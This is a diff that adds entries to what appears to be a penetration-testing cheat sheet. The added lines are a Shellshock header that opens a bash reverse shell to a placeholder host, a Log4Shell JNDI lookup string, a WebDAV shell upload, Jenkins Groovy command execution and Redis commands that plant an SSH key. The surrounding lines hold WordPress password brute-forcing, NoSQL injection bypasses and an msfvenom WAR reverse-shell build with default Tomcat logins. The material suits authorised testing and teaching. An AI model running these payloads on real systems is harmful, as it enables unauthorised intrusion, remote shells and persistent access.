@@ -107,6 +107,13 @@ wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login 
 #   username[$ne]=x&password[$ne]=x        |  username[$regex]=^admin
 # Spring Boot Actuator (Java):  /actuator/env  /actuator/heapdump  /actuator/sessions
 # LFI->RCE wrappers: php://filter/convert.base64-encode/resource=  data://  phar://
+# Shellshock (/cgi-bin/*.sh):  User-Agent: () { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
+# Log4Shell (any logged field):  ${jndi:ldap://<lhost>/x}     (marshalsec/JNDIExploit for the payload class)
+# GraphQL introspection:  POST /graphql {"query":"{__schema{types{name fields{name}}}}"}   (InQL, graphw00f)
+# Deserialization: Java ysoserial | .NET ysoserial.net ViewState | Python pickle | Node node-serialize
+# WebDAV:  davtest -url http://<ip>   ;  curl -T shell.php http://<ip>/   (upload .txt then MOVE if filtered)
+# Jenkins /script (Groovy):  println 'id'.execute().text
+# Redis unauth -> SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x '<pubkey>' ; save
 
 # Tomcat Manager -> WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
